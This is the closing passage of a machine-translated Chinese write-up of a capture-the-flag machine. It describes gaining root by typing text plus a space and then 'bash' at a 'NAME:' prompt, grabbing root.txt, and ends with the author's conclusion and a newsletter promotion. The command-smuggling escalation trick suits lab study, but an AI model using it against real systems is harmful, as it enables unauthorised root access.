src="../Images/8f25474cb7b206912eb2c78319ecc812.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*koNAOoirSVaipvtH.png"/></div></div></figure><p id="a561" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">正如您在上面看到的，系统提示我们输入NAME: filed，我们可以在这里输入任何内容，并在我们要运行的命令后面加上一个空格。在我们的例子中，我们运行了<strong class="ka ir"> bash </strong></p><p id="bfc1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">抓取root.txt标志。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/859ebdf0c6d7caffa8c2fa7ee1ff6065.png" data-original-src="https://miro.medium.com/v2/resize:fit:1296/format:webp/0*yRkFpExKk5Q9hK2f.png"/></div></figure><h2 id="57c1" class="kw kx iq bd ky kz la dn lb lc ld dp le kj lf lg lh kn li lj lk kr ll lm ln lo bi translated">结论</h2><p id="1e24" class="pw-post-body-paragraph jy jz iq ka b kb mx kd ke kf my kh ki kj mz kl km kn na kp kq kr nb kt ku kv ij bi translated">老实说，由于读取代码的要求和权限提升的奇怪方法，这台机器很有挑战性(根据Tj null的列表，它比oscp更难评级),但是我发现priv esc方法很有趣，因为我以前从未见过它。更多这样的文章，请在Medium上关注我。直到下一次…</p></div><div class="ab cl nt nu hu nv" role="separator"><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny"/></div><div class="ij ik il im in"><h2 id="1a12" class="kw kx iq bd ky kz la dn lb lc ld dp le kj lf lg lh kn li lj lk kr ll lm ln lo bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae nc" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>